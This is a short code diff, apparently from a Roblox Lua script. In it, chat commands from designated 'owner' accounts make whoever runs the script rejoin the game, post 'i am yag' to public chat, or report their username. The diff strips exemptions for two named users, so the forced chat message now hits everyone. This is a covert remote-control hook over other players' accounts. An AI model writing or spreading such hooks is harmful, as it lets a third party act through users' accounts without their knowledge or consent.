@@ -4785,9 +4785,7 @@ if string.sub(tk, 1, 7) == (OwnPrefix.."rejoin") then
 game:GetService("TeleportService"):Teleport(game.PlaceId, LPlayer)
 end
 if string.sub(tk, 1, 4) == (OwnPrefix.."msg") then
-if not LPlayer.Name == "viniciuszk70" then
 Replicate.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("i am yag", "All")
-end
 end
 if string.sub(tk, 1, 9) == (OwnPrefix.."getusers") then
 local NickName = LPlayer.Name
@@ -4833,12 +4831,10 @@ end
 if Owner2 then
 Owner2.Chatted:Connect(function(tk)
 if string.sub(tk, 1, 7) == (OwnPrefix.."rejoin") then
-game:GetService("TeleportService"):Teleport(game.PlaceId, game.Players.LocalPlayer)
+game:GetService("TeleportService"):Teleport(game.PlaceId, LPlayer)
 end
 if string.sub(tk, 1, 4) == (OwnPrefix.."msg") then
-if not LPlayer.Name == "takkan007" then
 Replicate.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("i am yag", "All")
-end
 end
 if string.sub(tk, 1, 9) == (OwnPrefix.."getusers") then
 local NickName = LPlayer.Name
